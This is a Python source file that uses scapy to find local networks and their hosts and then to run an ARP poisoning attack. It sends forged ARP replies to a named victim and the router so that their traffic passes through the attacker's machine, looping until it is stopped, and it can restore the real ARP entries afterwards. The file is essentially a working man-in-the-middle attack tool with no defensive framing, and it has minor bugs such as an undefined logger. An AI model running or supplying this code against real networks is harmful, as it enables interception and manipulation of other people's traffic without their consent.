from scapy.all import *
import Queue as que


queue = que.Queue()


def put_qu(put):
    queue.put(put)


def get_qu():
    queue.get(False)


# activate by typing in terminal sudo python scanning.py
def network_scanning():
    networklist = []
    for networkname, netmaskname, ignore, interfacename, ipaddress in scapy.config.conf.route.routes:

        # Getting info in right format
        network = scapy.utils.ltoa(networkname)
        netmask = 32 - int(round(math.log(0xFFFFFFFF - netmaskname, 2)))
        net = "%s/%s" % (network, netmask)
        if netmask < 16:
            print("Network is too big")
            net = 0

        if net:
            networklist += [net + ", " + interfacename]

    print(networklist)
    return networklist


def ip_scanning(networkSplit, timeout=5):
    net = networkSplit[0]
    interface = networkSplit[1]
    found_ips = []
    try:
        ans, unans = scapy.all.arping(net, iface=interface, timeout=timeout, verbose=True)
        for s, r in ans:
            ms = [r.src, r.psrc]
            found_ips.append(ms)

    except socket.error as e:
        raise

    return found_ips

def my_mac():
    interface = scapy.all.get_working_if()
    mac_address = get_if_hwaddr(interface)
    return mac_address


def restoring(ip_router, mac_router, ip_vic, mac_vic):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_router, hwsrc=mac_vic, psrc=ip_vic), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_vic, hwsrc=mac_router, psrc=ip_router), count=5)
    print("[*] Disabling IP forwarding")


def arp_spoofing(ip_router, mac_router, ip_vic, mac_vic, s, number, allOut):
    stop = s
    mode = allOut
    mac_me = my_mac()
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    if mode=="all out":
        while 1:
            try:
                message = queue.get(False)
                if message == "stop":
                    logger.info("Stopping DNS spoofing")
                    break
                else:
                    queue.put(message)
            except que.Empty:
                send(ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_vic, hwsrc=mac_me))
                send(ARP(op=2, pdst=ip_vic, hwdst=mac_vic, psrc=ip_router, hwsrc=mac_me))
                time.sleep(2)
        sys.exit(0)
    elif mode!="all out":
        for i in range(0, number):
            send(ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_vic, hwsrc=mac_me))
            send(ARP(op=2, pdst=ip_vic, hwdst=mac_vic, psrc=ip_router, hwsrc=mac_me))
            time.sleep(2)
    if not stop:
        print("[*] Stopped ARP poison attack. Restoring network")
        restoring(ip_router, mac_router, ip_vic, mac_vic)


